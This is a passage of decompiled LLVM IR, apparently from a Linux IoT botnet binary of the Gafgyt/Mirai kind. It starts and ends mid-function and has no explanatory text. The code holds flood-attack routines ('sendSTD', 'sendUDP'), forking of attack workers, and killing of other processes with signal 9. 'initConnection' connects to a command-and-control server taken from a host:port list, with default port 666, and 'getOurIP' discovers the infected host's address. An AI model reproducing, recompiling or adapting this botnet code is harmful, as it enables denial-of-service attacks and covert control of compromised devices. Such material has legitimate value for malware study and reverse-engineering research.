  %storemerge86211 = phi i32 [ %v2_804f356, %dec_label_pc_804f34c ], [ %v2_804f318, %dec_label_pc_804f30c ]
  %v0_804f325 = call i32 @listFork()
  store i32 %v0_804f325, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f32a = icmp eq i32 %v0_804f325, 0
  %v1_804f32c = icmp eq i1 %v1_804f32a, false
  %v0_804f34c = load i32, i32* @esp, align 4
  br i1 %v1_804f32c, label %dec_label_pc_804f34c, label %dec_label_pc_804f32e

dec_label_pc_804f32e:                             ; preds = %dec_label_pc_804f325
  %v5_804f32e = icmp ult i32 %v0_804f34c, 4
  store i1 %v5_804f32e, i1* %cf.global-to-local, align 1
  store i32 %storemerge86211, i32* %stack_var_-348, align 4
  %v3_804f33a = trunc i32 %v1_804f2d5 to i16
  %v4_804f33a = call i32 @sendSTD(i32 %storemerge86211, i16 %v3_804f33a, i32 %v1_804f2ec)
  store i1 %v5_804f293, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v1_804f347 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f34c:                             ; preds = %dec_label_pc_804f325
  %v5_804f34c = icmp ult i32 %v0_804f34c, 8
  store i1 %v5_804f34c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v2_804f356 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f361 = icmp eq i32 %v2_804f356, 0
  %v1_804f365 = icmp eq i1 %v4_804f361, false
  br i1 %v1_804f365, label %dec_label_pc_804f325, label %dec_label_pc_804f394

dec_label_pc_804f369:                             ; preds = %dec_label_pc_804f2be
  %v0_804f369 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f36e = icmp eq i32 %v0_804f369, 0
  %v1_804f370 = icmp eq i1 %v1_804f36e, false
  br i1 %v1_804f370, label %dec_label_pc_804f52b, label %dec_label_pc_804f376

dec_label_pc_804f376:                             ; preds = %dec_label_pc_804f369
  %v0_804f376 = load i32, i32* @esp, align 4
  %v5_804f376 = icmp ult i32 %v0_804f376, 4
  store i1 %v5_804f376, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2c4, i32* %stack_var_-348, align 4
  %v3_804f382 = trunc i32 %v1_804f2d5 to i16
  %v4_804f382 = call i32 @sendSTD(i32 %v2_804f2c4, i16 %v3_804f382, i32 %v1_804f2ec)
  store i1 %v5_804f293, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v1_804f38f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f394:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f34c, %dec_label_pc_804f222
  %v2_804f397 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804f3b4 = inttoptr i32 %v2_804f397 to i8*
  %v7_804f3c6 = call i32 @_strncmp(i8* %v4_804f3b4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058c16.430, i32 0, i32 0), i32 9)
  %v8_804f3c6 = urem i32 %v7_804f3c6, 2
  %v9_804f3c6 = icmp eq i32 %v8_804f3c6, 0
  %v0_804f3c8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3c8 = or i1 %v0_804f3c8, %v9_804f3c6
  %v3_804f3c8 = zext i1 %v2_804f3c8 to i32
  %v4_804f3c8 = load i32, i32* @edx, align 4
  %v5_804f3c8 = and i32 %v4_804f3c8, -256
  %v6_804f3c8 = or i32 %v3_804f3c8, %v5_804f3c8
  %v7_804f3c8 = xor i32 %v6_804f3c8, 1
  store i32 %v7_804f3c8, i32* @edx, align 4
  %v1_804f3d0 = trunc i32 %v7_804f3c8 to i8
  %v3_804f3d0 = zext i1 %v0_804f3c8 to i8
  %v15_804f3d0 = icmp eq i8 %v1_804f3d0, %v3_804f3d0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3d9 = icmp eq i1 %v15_804f3d0, false
  br i1 %v1_804f3d9, label %dec_label_pc_804f4da, label %dec_label_pc_804f446.preheader

dec_label_pc_804f446.preheader:                   ; preds = %dec_label_pc_804f394
  br label %dec_label_pc_804f446

dec_label_pc_804f3ef:                             ; preds = %dec_label_pc_804f483, %dec_label_pc_804f446
  %v2_804f3f2 = mul i32 %storemerge27, 4
  store i32 %v2_804f3f2, i32* %edx.global-to-local, align 4
  %v0_804f3f7 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804f3fc = add i32 %v0_804f3f7, %v2_804f3f2
  %v1_804f3ff = inttoptr i32 %v2_804f3fc to i32*
  %v2_804f3ff = load i32, i32* %v1_804f3ff, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f401 = icmp eq i32 %v2_804f3ff, 0
  br i1 %v1_804f401, label %dec_label_pc_804f443, label %dec_label_pc_804f405

dec_label_pc_804f405:                             ; preds = %dec_label_pc_804f3ef
  %v9_804f3f2 = and i32 %storemerge27, 1073741824
  %v10_804f3f2 = icmp ne i32 %v9_804f3f2, 0
  store i1 %v10_804f3f2, i1* %cf.global-to-local, align 1
  store i32 %v2_804f3f2, i32* %edx.global-to-local, align 4
  %v2_804f415 = load i32, i32* %v1_804f3ff, align 4
  store i32 %v2_804f415, i32* @ebx, align 4
  %v0_804f417 = call i32 @__libc_getpid()
  %v0_804f41c = load i32, i32* @ebx, align 4
  %v7_804f41c = icmp ult i32 %v0_804f41c, %v0_804f417
  store i1 %v7_804f41c, i1* %cf.global-to-local, align 1
  %v12_804f41c = icmp eq i32 %v0_804f41c, %v0_804f417
  br i1 %v12_804f41c, label %dec_label_pc_804f443, label %dec_label_pc_804f420

dec_label_pc_804f420:                             ; preds = %dec_label_pc_804f405
  store i32 %v2_804f3f2, i32* %edx.global-to-local, align 4
  %v0_804f428 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804f42d = add i32 %v0_804f428, %v2_804f3f2
  %v1_804f430 = inttoptr i32 %v2_804f42d to i32*
  %v2_804f430 = load i32, i32* %v1_804f430, align 4
  %v0_804f432 = load i32, i32* @esp, align 4
  %v5_804f432 = icmp ult i32 %v0_804f432, 8
  store i1 %v5_804f432, i1* %cf.global-to-local, align 1
  store i32 %v2_804f430, i32* %stack_var_-348, align 4
  %v2_804f438 = call i32 @kill(i32 %v2_804f430, i32 9)
  %v0_804f43d = load i32, i32* @esp, align 4
  %v2_804f43d = icmp ugt i32 %v0_804f43d, -17
  store i1 %v2_804f43d, i1* %cf.global-to-local, align 1
  %v4_804f440 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804f443

dec_label_pc_804f443:                             ; preds = %dec_label_pc_804f405, %dec_label_pc_804f3ef, %dec_label_pc_804f420
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804f3ef ], [ %stack_var_-28.1, %dec_label_pc_804f405 ], [ %v4_804f440, %dec_label_pc_804f420 ]
  %v4_804f443 = add i32 %storemerge27, 1
  br label %dec_label_pc_804f446

dec_label_pc_804f446:                             ; preds = %dec_label_pc_804f446.preheader, %dec_label_pc_804f443
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804f443 ], [ 0, %dec_label_pc_804f446.preheader ]
  %storemerge27 = phi i32 [ %v4_804f443, %dec_label_pc_804f443 ], [ 0, %dec_label_pc_804f446.preheader ]
  store i32 0, i32* @edi, align 4
  %v0_804f45a = load i32, i32* @global_var_805b548.34, align 8
  %v0_804f45f = load i32, i32* @global_var_805b54c.35, align 4
  store i32 %v0_804f45f, i32* %edx.global-to-local, align 4
  %v10_804f477 = icmp ne i32 %v0_804f45f, 0
  store i1 %v10_804f477, i1* %cf.global-to-local, align 1
  br i1 %v10_804f477, label %dec_label_pc_804f3ef, label %dec_label_pc_804f483

dec_label_pc_804f483:                             ; preds = %dec_label_pc_804f446
  store i32 %v0_804f45a, i32* @esi, align 4
  %v10_804f497 = icmp ult i32 %storemerge27, %v0_804f45a
  store i1 %v10_804f497, i1* %cf.global-to-local, align 1
  br i1 %v10_804f497, label %dec_label_pc_804f3ef, label %dec_label_pc_804f4a3

dec_label_pc_804f4a3:                             ; preds = %dec_label_pc_804f483
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp192 = icmp slt i32 %stack_var_-28.1, 1
  %v0_804f4c4 = load i32, i32* @global_var_805b540.20, align 64
  %v0_804f4c9 = load i32, i32* @esp, align 4
  br i1 %tmp192, label %dec_label_pc_804f4c4, label %dec_label_pc_804f4a9

dec_label_pc_804f4a9:                             ; preds = %dec_label_pc_804f4a3
  %v5_804f4ae = icmp ult i32 %v0_804f4c9, 4
  store i1 %v5_804f4ae, i1* %cf.global-to-local, align 1
  store i32 %v0_804f4c4, i32* %stack_var_-364, align 4
  %v3_804f4ba = call i32 @sockprintf(i32 %v0_804f4c4, i32 ptrtoint ([11 x i8]* @global_var_8058c1f.431 to i32))
  %v0_804f4bf = load i32, i32* @esp, align 4
  %v2_804f4bf = icmp ugt i32 %v0_804f4bf, -17
  store i1 %v2_804f4bf, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f4da

dec_label_pc_804f4c4:                             ; preds = %dec_label_pc_804f4a3
  %v5_804f4c9 = icmp ult i32 %v0_804f4c9, 8
  store i1 %v5_804f4c9, i1* %cf.global-to-local, align 1
  store i32 %v0_804f4c4, i32* %stack_var_-364, align 4
  %v3_804f4d2 = call i32 @sockprintf(i32 %v0_804f4c4, i32 ptrtoint ([13 x i8]* @global_var_8058c2a.432 to i32))
  %v0_804f4d7 = load i32, i32* @esp, align 4
  %v2_804f4d7 = icmp ugt i32 %v0_804f4d7, -17
  store i1 %v2_804f4d7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f4da

dec_label_pc_804f4da:                             ; preds = %dec_label_pc_804f394, %dec_label_pc_804f4a9, %dec_label_pc_804f4c4
  %v2_804f4dd = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804f4fa = inttoptr i32 %v2_804f4dd to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_8058c37.433 to i32), i32* @edi, align 4
  %v7_804f50c = call i32 @_strncmp(i8* %v4_804f4fa, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058c37.433, i32 0, i32 0), i32 10)
  %v8_804f50c = urem i32 %v7_804f50c, 2
  %v9_804f50c = icmp eq i32 %v8_804f50c, 0
  %v0_804f50e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f50e = or i1 %v0_804f50e, %v9_804f50c
  %v3_804f50e = zext i1 %v2_804f50e to i32
  %v4_804f50e = load i32, i32* @edx, align 4
  %v5_804f50e = and i32 %v4_804f50e, -256
  %v6_804f50e = or i32 %v3_804f50e, %v5_804f50e
  %v7_804f50e = xor i32 %v6_804f50e, 1
  store i32 %v7_804f50e, i32* %edx.global-to-local, align 4
  %v1_804f516 = trunc i32 %v7_804f50e to i8
  %v3_804f516 = zext i1 %v0_804f50e to i8
  %v4_804f516 = sub nsw i8 %v1_804f516, %v3_804f516
  %v15_804f516 = icmp eq i8 %v4_804f516, 0
  %v2_804f51a = sext i8 %v4_804f516 to i32
  store i32 %v2_804f51a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f51f = icmp eq i1 %v15_804f516, false
  br i1 %v1_804f51f, label %dec_label_pc_804f52b, label %dec_label_pc_804f521

dec_label_pc_804f521:                             ; preds = %dec_label_pc_804f4da
  %v0_804f521 = load i32, i32* @esp, align 4
  %v5_804f521 = icmp ult i32 %v0_804f521, 12
  store i1 %v5_804f521, i1* %cf.global-to-local, align 1
  %v1_804f526 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f52b

dec_label_pc_804f52b:                             ; preds = %dec_label_pc_804ed29, %dec_label_pc_804ed75, %dec_label_pc_804f0a1, %dec_label_pc_804f4da, %dec_label_pc_804f369, %dec_label_pc_804f196, %dec_label_pc_804ed95, %dec_label_pc_804e940, %dec_label_pc_804e8b2, %dec_label_pc_804f2a3, %dec_label_pc_804eec5, %dec_label_pc_804ebf3, %dec_label_pc_804ea93, %dec_label_pc_804e969, %dec_label_pc_804e7fb, %dec_label_pc_804e799, %dec_label_pc_804f521
  %v0_804f532 = phi i32 [ %v2_804f096, %dec_label_pc_804f0a1 ], [ %v2_804f51a, %dec_label_pc_804f4da ], [ %v0_804f369, %dec_label_pc_804f369 ], [ %v0_804f196, %dec_label_pc_804f196 ], [ %v0_804ed95, %dec_label_pc_804ed95 ], [ %v0_804e940, %dec_label_pc_804e940 ], [ 0, %dec_label_pc_804e8b2 ], [ %v2_804f2b1, %dec_label_pc_804f2a3 ], [ %v2_804eed3, %dec_label_pc_804eec5 ], [ %v2_804ec01, %dec_label_pc_804ebf3 ], [ %v2_804eab4, %dec_label_pc_804ea93 ], [ %v1_804e94d, %dec_label_pc_804e969 ], [ %v2_804e810, %dec_label_pc_804e7fb ], [ %v2_804e7a7, %dec_label_pc_804e799 ], [ %v1_804f526, %dec_label_pc_804f521 ], [ %v2_804ed35, %dec_label_pc_804ed29 ], [ %v2_804ed7f, %dec_label_pc_804ed75 ]
  %v2_804f52e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f52e, i32* @ebx, align 4
  store i32 %v0_804e74a, i32* @esi, align 4
  store i32 %v0_804e749, i32* @edi, align 4
  ret i32 %v0_804f532

; uselistorder directives
  uselistorder i1 %v0_804f50e, { 1, 0 }
  uselistorder i32 %v0_804f4c9, { 1, 0 }
  uselistorder i32 %v0_804f4c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f45a, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804f430, { 1, 0 }
  uselistorder i32 %v2_804f3f2, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804f3c8, { 1, 0 }
  uselistorder i32 %v2_804f356, { 1, 0 }
  uselistorder i32 %v0_804f34c, { 1, 0 }
  uselistorder i32 %v2_804f2e6, { 1, 0 }
  uselistorder i32 %v2_804f2cf, { 1, 0 }
  uselistorder i32 %v2_804f2c4, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804f2a3, { 1, 0 }
  uselistorder i1 %v5_804f293, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804f291, { 1, 0 }
  uselistorder i32 %v2_804f279, { 1, 0 }
  uselistorder i1 %v0_804f256, { 1, 0 }
  uselistorder i1 %v5_804f1c1, { 0, 2, 1 }
  uselistorder i1 %v5_804f111, { 0, 2, 1 }
  uselistorder i1 %v5_804f0d1, { 1, 0 }
  uselistorder i32* %v1_804f0b1, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804f08a, { 1, 0 }
  uselistorder i32 %v7_804f088, { 1, 0 }
  uselistorder i32 %v2_804f010, { 1, 0 }
  uselistorder i32 %v0_804f006, { 1, 0 }
  uselistorder i1 %v5_804efa8, { 1, 0 }
  uselistorder i32 %v2_804eee6, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804ee84, { 1, 0 }
  uselistorder i32 %v1_804ee7c, { 0, 3, 1, 2 }
  uselistorder i1 %v5_804ee46, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i1 %v0_804ee00, { 1, 0 }
  uselistorder i32 %v2_804ed7f, { 0, 2, 1 }
  uselistorder i1 %v5_804ed17, { 1, 0 }
  uselistorder i32 %v2_804eceb, { 1, 0 }
  uselistorder i32 %v1_804ecbc, { 2, 1, 0 }
  uselistorder i32 %v2_804ecb6, { 1, 0 }
  uselistorder i32 %v1_804ec87, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804ec81, { 1, 0 }
  uselistorder i32 %v1_804ec6a, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804ec64, { 1, 0 }
  uselistorder i32 %v2_804ec4d, { 1, 0 }
  uselistorder i32 %v2_804ec36, { 1, 0 }
  uselistorder i32 %v2_804ec1f, { 1, 0 }
  uselistorder i32 %v2_804ec14, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804ebf3, { 1, 0 }
  uselistorder i32 %v2_804ebe1, { 1, 0 }
  uselistorder i1 %v8_804ebd5, { 1, 0, 2 }
  uselistorder i32 %v1_804ebd0, { 1, 0 }
  uselistorder i32 %v1_804ebc8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804ebc2, { 1, 0 }
  uselistorder i32 %v1_804ebb5, { 1, 0 }
  uselistorder i32 %v1_804ebad, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804eba7, { 1, 0 }
  uselistorder i32 %v1_804eb9a, { 1, 0 }
  uselistorder i32 %v1_804eb92, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804eb8c, { 1, 0 }
  uselistorder i32 %v2_804eb73, { 1, 0 }
  uselistorder i32 %v2_804eb56, { 1, 0 }
  uselistorder i1 %v5_804eb3b, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804eb39, { 1, 0 }
  uselistorder i32 %v2_804eb1c, { 1, 0 }
  uselistorder i1 %v0_804eaf5, { 1, 0 }
  uselistorder i1 %v0_804ea80, { 1, 0 }
  uselistorder i32 %v0_804ea25, { 1, 0, 2 }
  uselistorder i1 %v0_804e9f8, { 1, 0 }
  uselistorder i32 %v0_804e991, { 1, 0, 2 }
  uselistorder i1 %v0_804e929, { 1, 0 }
  uselistorder i32 %v0_804e8d2, { 1, 0 }
  uselistorder i32 %v0_804e8b2, { 1, 0, 2 }
  uselistorder i1 %v0_804e89f, { 1, 0 }
  uselistorder i1 %v0_804e851, { 1, 0 }
  uselistorder i32 %v0_804e800, { 1, 0, 2 }
  uselistorder i1 %v0_804e7e8, { 1, 0 }
  uselistorder i32 %v0_804e799, { 1, 0 }
  uselistorder i1 %v0_804e786, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-332, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-348, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32* %stack_var_-364, { 7, 8, 0, 1, 2, 3, 4, 5, 14, 9, 10, 6, 11, 12, 13 }
  uselistorder i32 %tmp162, { 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %tmp134, { 2, 14, 3, 13, 0, 12, 4, 5, 11, 6, 7, 1, 10, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 10, 9, 11, 12, 15, 13, 14, 16, 17, 19, 18, 20, 21, 22 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 14, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12, 15, 179, 16, 17, 18, 23, 19, 20, 21, 22, 180, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 181, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 182, 51, 52, 53, 54, 55, 183, 56, 57, 58, 63, 59, 60, 61, 62, 184, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 178, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 134, 94, 95, 99, 96, 97, 98, 185, 100, 101, 102, 103, 104, 105, 106, 177, 107, 108, 176, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 135, 139, 136, 137, 138, 140, 146, 141, 142, 143, 144, 145, 147, 164, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 168, 166, 167, 169, 172, 170, 171, 173, 174, 175 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8058771.303 to i32), { 6, 0, 5, 1, 4, 2, 7, 3, 8, 9 }
  uselistorder label %dec_label_pc_804f52b, { 16, 3, 4, 9, 5, 2, 10, 6, 1, 0, 11, 12, 13, 7, 8, 14, 15 }
  uselistorder label %dec_label_pc_804f4da, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f446, { 1, 0 }
  uselistorder label %dec_label_pc_804f443, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f394, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f325, { 1, 0 }
  uselistorder label %dec_label_pc_804f2a3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f222, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f0ea, { 1, 0 }
  uselistorder label %dec_label_pc_804f056, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804efd3, { 1, 0 }
  uselistorder label %dec_label_pc_804ef9c, { 1, 0 }
  uselistorder label %dec_label_pc_804ef67, { 1, 0 }
  uselistorder label %dec_label_pc_804eee0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804eec5, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804ed42, { 1, 0 }
  uselistorder label %dec_label_pc_804ed0b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ebf3, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e8f2, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804f53c = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804f550 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804f550 = call i32 @__GI_memset(i8* %v3_804f550, i32 0, i32 4096)
  %v0_804f558 = load i32, i32* @global_var_805b540.20, align 64
  %v1_804f55d = icmp eq i32 %v0_804f558, 0
  br i1 %v1_804f55d, label %dec_label_pc_804f57c, label %dec_label_pc_804f561

dec_label_pc_804f561:                             ; preds = %entry
  %v1_804f56a = call i32 @__libc_close(i32 %v0_804f558)
  store i32 0, i32* @global_var_805b540.20, align 64
  br label %dec_label_pc_804f57c

dec_label_pc_804f57c:                             ; preds = %entry, %dec_label_pc_804f561
  %v0_804f57c = load i32, i32* @global_var_805b19c.434, align 4
  %v1_804f581 = icmp eq i32 %v0_804f57c, 0
  %v1_804f583 = icmp eq i1 %v1_804f581, false
  br i1 %v1_804f583, label %dec_label_pc_804f591, label %dec_label_pc_804f59c

dec_label_pc_804f591:                             ; preds = %dec_label_pc_804f57c
  %v1_804f596 = add i32 %v0_804f57c, 1
  br label %dec_label_pc_804f59c

dec_label_pc_804f59c:                             ; preds = %dec_label_pc_804f57c, %dec_label_pc_804f591
  %storemerge = phi i32 [ %v1_804f596, %dec_label_pc_804f591 ], [ 0, %dec_label_pc_804f57c ]
  store i32 %storemerge, i32* @global_var_805b19c.434, align 4
  %v1_804f5a1 = mul i32 %storemerge, 4
  %v2_804f5a1 = add i32 %v1_804f5a1, ptrtoint ([19 x i8]** @global_var_805b198.435 to i32)
  %v3_804f5a1 = inttoptr i32 %v2_804f5a1 to i32*
  %v4_804f5a1 = load i32, i32* %v3_804f5a1, align 4
  store i32 %v4_804f5a1, i32* @eax, align 4
  %v3_804f5b3 = call i32 @strcpy(i8* %v3_804f550, i32 %v4_804f5a1)
  %v3_804f5ce = call i32 @__GI_strchr(i8* %v3_804f550, i32 58)
  %v1_804f5d6 = icmp eq i32 %v3_804f5ce, 0
  br i1 %v1_804f5d6, label %dec_label_pc_804f615, label %dec_label_pc_804f5da

dec_label_pc_804f5da:                             ; preds = %dec_label_pc_804f59c
  %v3_804f5e6 = call i32 @__GI_strchr(i8* %v3_804f550, i32 58)
  %v1_804f5ee = add i32 %v3_804f5e6, 1
  %v1_804f5f3 = call i32 @atol(i32 %v1_804f5ee)
  %v3_804f60a = call i32 @__GI_strchr(i8* %v3_804f550, i32 58)
  %v4_804f60a = inttoptr i32 %v3_804f60a to i8*
  store i8 0, i8* %v4_804f60a, align 1
  br label %dec_label_pc_804f615

dec_label_pc_804f615:                             ; preds = %dec_label_pc_804f59c, %dec_label_pc_804f5da
  %stack_var_-8.0 = phi i32 [ 666, %dec_label_pc_804f59c ], [ %v1_804f5f3, %dec_label_pc_804f5da ]
  %v3_804f61e = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804f61e, i32* @global_var_805b540.20, align 64
  %v4_804f63e = call i32 @connectTimeout(i32 %v3_804f61e, i32 %v2_804f53c, i32 %stack_var_-8.0, i32 30)
  %v1_804f646 = icmp eq i32 %v4_804f63e, 0
  %. = zext i1 %v1_804f646 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f615, { 1, 0 }
  uselistorder label %dec_label_pc_804f59c, { 1, 0 }
  uselistorder label %dec_label_pc_804f57c, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804f67a = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804f685 = icmp eq i32 %v5_804f67a, -1
  %v1_804f689 = icmp eq i1 %v13_804f685, false
  br i1 %v1_804f689, label %dec_label_pc_804f69a, label %dec_label_pc_804f85d

dec_label_pc_804f69a:                             ; preds = %entry
  %v2_804f69a = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804f6c6 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8058c41.436 to i32))
  %v2_804f6d6 = call i32 @htons(i32 53)
  %v5_804f6ee = call i32 @__libc_connect(i32 %v5_804f67a, i32 %v2_804f69a, i32 16)
  %v13_804f6f9 = icmp eq i32 %v5_804f6ee, -1
  %v1_804f6fd = icmp eq i1 %v13_804f6f9, false
  br i1 %v1_804f6fd, label %dec_label_pc_804f70e, label %dec_label_pc_804f85d

dec_label_pc_804f70e:                             ; preds = %dec_label_pc_804f69a
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804f715 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804f71b = ptrtoint i32* %stack_var_-60 to i32
  %v5_804f723 = call i32 @__GI_getsockname(i32 %v5_804f67a, i32 %v2_804f715, i32 %v2_804f71b)
  %v13_804f72e = icmp eq i32 %v5_804f723, -1
  %v1_804f732 = icmp eq i1 %v13_804f72e, false
  br i1 %v1_804f732, label %dec_label_pc_804f743, label %dec_label_pc_804f85d

dec_label_pc_804f743:                             ; preds = %dec_label_pc_804f70e
  %v5_804f755 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8058c49.437, i32 0, i32 0), i32 0)
  %v2_804f7b8 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804f7ca51 = call i32 @fdgets(i32 %v2_804f7b8, i32 4096, i32 %v5_804f755)
  %v1_804f7d252 = icmp eq i32 %v5_804f7ca51, 0
  %v1_804f7d453 = icmp eq i1 %v1_804f7d252, false
  br i1 %v1_804f7d453, label %dec_label_pc_804f762, label %dec_label_pc_804f7d6

dec_label_pc_804f762:                             ; preds = %dec_label_pc_804f743, %dec_label_pc_804f79c
  %v5_804f771 = call i32 @strstr(i32 %v2_804f7b8, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058c59.438, i32 0, i32 0))
  %v1_804f779 = icmp eq i32 %v5_804f771, 0
  br i1 %v1_804f779, label %dec_label_pc_804f79c, label %dec_label_pc_804f78b.preheader

dec_label_pc_804f78b.preheader:                   ; preds = %dec_label_pc_804f762
  %v2_804f78e42 = load i8, i8* %stack_var_-4156, align 1
  %v10_804f79047 = icmp eq i8 %v2_804f78e42, 9
  %v1_804f79248 = icmp eq i1 %v10_804f79047, false
  br i1 %v1_804f79248, label %dec_label_pc_804f788, label %dec_label_pc_804f794

dec_label_pc_804f788:                             ; preds = %dec_label_pc_804f78b.preheader, %dec_label_pc_804f788
  %v4_804f78b49 = phi i32 [ %v5_804f788, %dec_label_pc_804f788 ], [ %v2_804f7b8, %dec_label_pc_804f78b.preheader ]
  %v5_804f788 = add i32 %v4_804f78b49, 1
  %v22_804f788 = inttoptr i32 %v5_804f788 to i8*
  %v2_804f78e = load i8, i8* %v22_804f788, align 1
  %v10_804f790 = icmp eq i8 %v2_804f78e, 9
  %v1_804f792 = icmp eq i1 %v10_804f790, false
  br i1 %v1_804f792, label %dec_label_pc_804f788, label %dec_label_pc_804f794

dec_label_pc_804f794:                             ; preds = %dec_label_pc_804f788, %dec_label_pc_804f78b.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804f78b.preheader ], [ %v22_804f788, %dec_label_pc_804f788 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
